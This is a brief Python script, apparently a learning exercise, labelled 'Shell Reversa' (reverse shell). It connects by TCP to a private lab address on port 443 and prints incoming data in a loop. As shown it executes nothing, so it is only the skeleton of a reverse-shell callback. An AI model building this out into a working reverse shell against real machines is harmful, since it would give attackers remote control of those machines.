# Shell Reversa
import socket
#destination IP
IP   = "192.168.56.101"
PORT = 443
#realizar conection
c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((IP, PORT))
#manter conection aberta (1024 representa o numero de bytes que esta sendo recebido) 
while True:
    data = c.recv(1024)
    print(data)